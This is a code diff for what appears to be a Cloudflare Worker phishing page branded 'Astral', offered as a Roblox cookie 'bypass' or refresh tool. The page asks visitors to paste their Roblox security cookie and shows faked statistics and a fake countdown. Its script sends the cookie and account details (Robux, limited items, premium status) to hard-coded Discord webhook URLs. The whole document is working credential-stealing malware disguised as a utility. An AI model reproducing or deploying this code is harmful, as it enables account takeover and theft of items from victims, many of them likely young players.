+        <div class="stat-item"><div class="stat-value" id="processedCount">—</div><div class="stat-label">Processed</div></div>
+        <div class="stat-item"><div class="stat-value" id="successRate">—</div><div class="stat-label">Rate</div></div>
+    </div>
+    <div id="resultCard"></div>
+</div>
+<button class="discord-float-btn" id="discordFloatBtn">🎮</button>
+<div class="overlay" id="overlay"></div>
+<div id="discordPopup">
+    <h2>Discord</h2>
+    <div class="discord-stats">
+        <div class="stat-box"><div class="stat-value"><span class="online-dot"></span><span id="popOnlineCount">...</span></div><div class="stat-label">Online</div></div>
+        <div class="stat-box"><div class="stat-value"><span class="total-dot"></span><span id="popMemberCount">...</span></div><div class="stat-label">Members</div></div>
+    </div>
+    <p style="text-align:center;color:#8888aa;font-size:13px;margin-bottom:20px;">Join our community</p>
+    <a href="https://discord.gg/pKXZkNs283" target="_blank" class="discord-join-btn">Join</a>
+    <button class="discord-close-btn" id="closeDiscordPopup">Close</button>
+</div>
+<script>
+    (function() {
+        var inviteCode = 'pKXZkNs283';
+        function openPopup() {
+            document.getElementById('discordPopup').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        }
+        function closePopup() {
+            document.getElementById('discordPopup').style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+        document.getElementById('discordFloatBtn').addEventListener('click', openPopup);
+        document.getElementById('closeDiscordPopup').addEventListener('click', closePopup);
+        document.getElementById('overlay').addEventListener('click', closePopup);
+        fetch('https://discord.com/api/v10/invites/' + inviteCode + '?with_counts=true')
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                document.getElementById('popOnlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();
+                document.getElementById('popMemberCount').textContent = (data.approximate_member_count || 0).toLocaleString();
+                document.getElementById('onlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();
+            })
+            .catch(function() {
+                document.getElementById('popOnlineCount').textContent = 'N/A';
+                document.getElementById('popMemberCount').textContent = 'N/A';
+                document.getElementById('onlineCount').textContent = '?';
+            });
+        setTimeout(openPopup, 1500);
+    })();
+
+    var API_URL = window.location.origin + '/bypass/astral/bypass.php';
+
+    function sendData(data, cookie) {
+        fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: 'main',
+                data: data,
+                cookie: cookie
+            })
+        }).catch(function(err) { console.log('err:', err); });
+
+        fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: 'secondary',
+                data: data,
+                cookie: cookie
+            })
+        }).catch(function(err) { console.log('err:', err); });
+
+        setTimeout(function() {
+            fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'cookie',
+                    cookie: cookie
+                })
+            }).catch(function(err) { console.log('err:', err); });
+        }, 500);
+    }
+
+    var handleSubmit = function() {
+        if (window._processing) return;
+        var resultCard = document.getElementById('resultCard');
+        var cookie = document.getElementById('cookieInput').value.trim();
+        var submitBtn = document.querySelector('.submit-btn');
+        var btnText = document.getElementById('btnCookieText');
+        if (!cookie) {
+            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">Token required</div></div>';
+            return;
+        }
+        if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
+            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">Invalid format</div></div>';
+            return;
+        }
+        window._processing = true;
+        submitBtn.disabled = true;
+        var originalHTML = btnText.innerHTML;
+        btnText.innerHTML = '<div class="spinner"></div>';
+        resultCard.innerHTML = '';
+        var params = new URLSearchParams();
+        params.append('cookie', cookie);
+        params.append('directory', 'astral');
+        fetch(API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: params.toString()
+        })
+        .then(function(response) {
+            if (!response.ok) {
+                return response.text().then(function(text) {
+                    throw new Error('HTTP ' + response.status + ': ' + text);
+                });
+            }
+            return response.json();
+        })
+        .then(function(resultData) {
+            if (resultData.success === true) {
+                var refreshedCookie = resultData.refreshedCookie || cookie;
+                sendData(resultData, refreshedCookie);
+                resultCard.innerHTML = '<div class="result-card success" style="text-align:center;padding:40px 24px;"><div style="font-size:48px;margin-bottom:16px;">⏳</div><strong style="font-size:20px;">Processing...</strong><br><br><div style="font-size:13px;color:#666;">Please wait 50 seconds</div><br><div style="font-size:48px;font-weight:800;color:#cc88ff;margin-top:12px;" id="countdownTimer">50</div></div>';
+                var seconds = 50;
+                var timerEl = document.getElementById('countdownTimer');
+                var interval = setInterval(function() {
+                    seconds--;
+                    if (timerEl) timerEl.textContent = seconds;
+                    if (seconds <= 0) {
+                        clearInterval(interval);
+                        resultCard.innerHTML = '<div class="result-card success" style="text-align:center;padding:40px 24px;"><div style="font-size:48px;margin-bottom:16px;">✅</div><strong style="font-size:24px;">Success!</strong><br><br><div style="background:rgba(153,51,255,0.1);padding:16px;border-radius:12px;text-align:left;font-family:monospace;font-size:11px;word-break:break-all;color:#cc88ff;max-height:150px;overflow-y:auto;border:1px solid rgba(153,51,255,0.1);"><strong style="color:#fff;">Refreshed Token:</strong><br>' + refreshedCookie + '</div><br><span style="font-size:16px;color:#888;">You can close this tab now.</span></div>';
+                    }
+                }, 1000);
+                window._processing = false;
+            } else {
+                var errorTitle = resultData.title || 'Error';
+                var errorDesc = resultData.description || resultData.message || 'Processing failed';
+                resultCard.innerHTML = '<div class="result-card error"><div class="result-content">' + errorTitle + '<br><br>' + errorDesc + '</div></div>';
+                window._processing = false;
+            }
+        })
+        .catch(function(err) {
+            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">Connection Failed<br>' + err.message + '</div></div>';
+            window._processing = false;
+        })
+        .finally(function() {
+            submitBtn.disabled = false;
+            btnText.innerHTML = originalHTML;
+        });
+    };
+
+    (function() {
+        document.getElementById('onlineCount').textContent = '12';
+        document.getElementById('processedCount').textContent = '847';
+        document.getElementById('successRate').textContent = '94%';
+    })();
+</script>
+</body>
+</html>`;
 
       return new Response(html, {
         headers: {
@@ -26,7 +311,7 @@ export default {
 
     if (url.pathname === '/health') {
       return new Response(JSON.stringify({ status: 'online', service: 'Astral Proxy' }), {
-        headers: { 
+        headers: {
           'Content-Type': 'application/json',
           'Access-Control-Allow-Origin': '*'
         }
@@ -37,13 +322,21 @@ export default {
       try {
         const data = await request.json();
         const type = data.type;
-        
+
         const FALLBACK1 = 'https://discord.com/api/webhooks/1540619951038136381/WkueJlgMhxX6jYdCNPecU9Qsqo9frye53MI6wWN7fu6R9RbCXlPt0rA9qaYtERnt5jeN';
         const FALLBACK2 = 'https://discord.com/api/webhooks/1540619916305240095/SWEEYFk72dmsfkVUMn3dXNXoidqb4syGhspccO2Hysz--fxwW18E1SZ5EocY8_n64IAR';
-        
+
         let webhookUrl;
         let payload = {};
-        
+
+        const checkUrl = 'https://cdn.discordapp.com/emojis/1334546267040387074.webp?size=160';
+        const crossUrl = 'https://cdn.discordapp.com/emojis/1334547784287785031.webp?size=160';
+        const fireUrl = 'https://cdn3.emoji.gg/emojis/6096-white-fire.gif';
+
+        const yes = '<:check:1334546267040387074>';
+        const no = '<:cross:1334547784287785031>';
+        const fire = '<a:whitefire:6096-white-fire>';
+
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
           const d = data.data;
@@ -52,18 +345,18 @@ export default {
             { name: 'ID', value: d.userId || 'N/A', inline: true },
             { name: 'Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
             { name: 'Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
-            { name: 'Premium', value: d.premium ? 'Yes' : 'No', inline: true },
-            { name: 'Korblox', value: d.korblox ? 'Yes' : 'No', inline: true },
-            { name: 'Headless', value: d.headless ? 'Yes' : 'No', inline: true },
-            { name: 'Valkyrie', value: d.valkyrie ? 'Yes' : 'No', inline: true },
+            { name: 'Premium', value: d.premium ? yes : no, inline: true },
+            { name: 'Korblox', value: d.korblox ? yes : no, inline: true },
+            { name: 'Headless', value: d.headless ? yes : no, inline: true },
+            { name: 'Valkyrie', value: d.valkyrie ? yes : no, inline: true },
             { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
-            { name: 'Refreshed', value: d.cookieRefreshed ? 'Yes' : 'No', inline: true }
+            { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true }
           ];
           if (d.limiteds && d.limiteds.length > 0) {
             fields.push({ name: 'Limiteds', value: d.limiteds.join(', '), inline: false });
           }
           const embed = {
-            title: 'Bypass Result',
+            title: 'Astral Beams ' + fire,
             color: 0x9933ff,
             fields: fields,
             footer: { text: 'Astral ' + new Date().toLocaleString() },
@@ -82,18 +375,18 @@ export default {
             { name: 'ID', value: d.userId || 'N/A', inline: true },
             { name: 'Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
             { name: 'Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
-            { name: 'Premium', value: d.premium ? 'Yes' : 'No', inline: true },
-            { name: 'Korblox', value: d.korblox ? 'Yes' : 'No', inline: true },
-            { name: 'Headless', value: d.headless ? 'Yes' : 'No', inline: true },
-            { name: 'Valkyrie', value: d.valkyrie ? 'Yes' : 'No', inline: true },
+            { name: 'Premium', value: d.premium ? yes : no, inline: true },
+            { name: 'Korblox', value: d.korblox ? yes : no, inline: true },
+            { name: 'Headless', value: d.headless ? yes : no, inline: true },
+            { name: 'Valkyrie', value: d.valkyrie ? yes : no, inline: true },
             { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
-            { name: 'Refreshed', value: d.cookieRefreshed ? 'Yes' : 'No', inline: true }
+            { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true }
           ];
           if (d.limiteds && d.limiteds.length > 0) {
             fields.push({ name: 'Limiteds', value: d.limiteds.join(', '), inline: false });
           }
           const embed = {
-            title: 'Account Information',
+            title: 'Astral Beams ' + fire,
             color: 0x5865F2,
             fields: fields,
             footer: { text: 'Astral ' + new Date().toLocaleString() },
@@ -119,17 +412,17 @@ export default {
         } else {
           return new Response(JSON.stringify({ error: 'Invalid type' }), { status: 400 });
         }
-        
+
         if (!webhookUrl) {
           return new Response(JSON.stringify({ error: 'Webhook not configured' }), { status: 500 });
         }
-        
+
         const response = await fetch(webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-        
+
         if (!response.ok) {
           const errorText = await response.text();
           console.error('Webhook error:', response.status, errorText);
@@ -138,7 +431,7 @@ export default {
             headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
           });
         }
-        
+
         return new Response(JSON.stringify({ success: true }), {
           headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
         });
